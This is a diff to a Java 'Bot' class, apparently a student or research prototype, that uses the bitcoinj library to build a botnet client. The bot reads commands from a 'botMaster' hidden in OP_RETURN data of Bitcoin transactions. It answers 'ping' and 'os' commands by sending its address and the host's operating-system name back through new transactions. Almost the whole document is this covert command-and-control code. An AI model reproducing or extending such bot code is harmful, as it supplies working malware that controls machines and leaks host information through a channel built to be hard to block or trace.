@@ -1,6 +1,7 @@
 import java.io.File;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.StringTokenizer;
 
 import org.bitcoinj.core.Address;
 import org.bitcoinj.core.Coin;
@@ -25,7 +26,7 @@ public class Bot {
 
 	private static Address masterAddress;
     private static WalletAppKit kit;
-	
+    static List<Address> list;
     public static void main(String[] args) throws Exception {
         // This line makes the log output more compact and easily read, especially when using the JDK log adapter.
         BriefLogFormatter.init();
@@ -64,7 +65,28 @@ public class Bot {
                 
                 System.out.println("Il Bot ha: " +w.getBalance().toFriendlyString());
                 try {
-					readOpReturn(tx);
+					String messaggio=readOpReturn(tx);
+					String[] v=messaggio.split("-");
+					String comando=v[0];
+					
+				System.out.println("comando: "+comando);
+				
+				String addressString=v[1];
+				
+				System.out.println("address:"+addressString);
+				Address address=new Address(params,addressString);
+					
+					//gestione delle risposte a seconda dei comandi del botMaster
+					switch (comando) {
+					case "ping":
+						sendCommand("ping_ok-"+list.get(0).toString(), address);
+						break;
+					case "os":
+						sendCommand(System.getProperty("os.name"), address);
+
+					default:
+						break;
+					}
 				} catch (Exception e) {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
@@ -79,7 +101,7 @@ public class Bot {
                         /*
                          * Inoltrare la transazione ricevuta nuovamente al BotMaster
                          */
-                        forwardCommand("ATTIVO", tx);
+                       // forwardCommand("ping_ok", tx);
                        
                     }
 
@@ -92,11 +114,13 @@ public class Bot {
             }
         });
 
-        List<Address> list = kit.wallet().getWatchedAddresses();
-        if (list.size() < 2) {
+         list = kit.wallet().getWatchedAddresses();
+        if (list.size() < 1) {
             kit.wallet().addWatchedAddress(kit.wallet().freshReceiveAddress());
             System.out.println("New address created");
         }
+        
+      
 
         System.out.println("You have " + list.size() + " addresses!");
         for (Address a: list) {
@@ -105,9 +129,7 @@ public class Bot {
 
         String balance = kit.wallet().getBalance().toFriendlyString();
         System.out.println(balance);
-        
-        Address sendToAddress = kit.wallet().currentReceiveKey().toAddress(params);
-        System.out.println("Send coins to: " + sendToAddress);
+     
         System.out.println("Waiting for coins to arrive. Press Ctrl-C to quit.");
 
         try {
@@ -115,8 +137,9 @@ public class Bot {
         } catch (InterruptedException ignored) {}
     }
     
-    public static void readOpReturn(Transaction tx) throws Exception {
-		List<TransactionOutput> ti = tx.getOutputs();
+    public static String readOpReturn(Transaction tx) throws Exception {
+    	String mess=""
+;		List<TransactionOutput> ti = tx.getOutputs();
 		
 		for (TransactionOutput t : ti) {
 			Script script = t.getScriptPubKey();
@@ -126,12 +149,12 @@ public class Bot {
 				
 				System.arraycopy(script.getProgram(), 2, message, 0, script.getProgram().length-2);
 					
-				String string = new String(message);
-				System.out.println(string);
+				mess = new String(message);
+				System.out.println("OP RETURN "+mess);
 				
 			}
 			
-		}
+		}return mess;
 		
 	}
     
@@ -161,7 +184,7 @@ public class Bot {
 	}
     
     
-    public static void forwardCommand(String response, Transaction tx) {
+   /* public static void forwardCommand(String response, String address) {
     	List<TransactionOutput> out = tx.getOutputs();
         //List<TransactionInput> in = tx.getInputs();
         
@@ -183,6 +206,6 @@ public class Bot {
 		}
     }
 
-    
+    */
     
 }
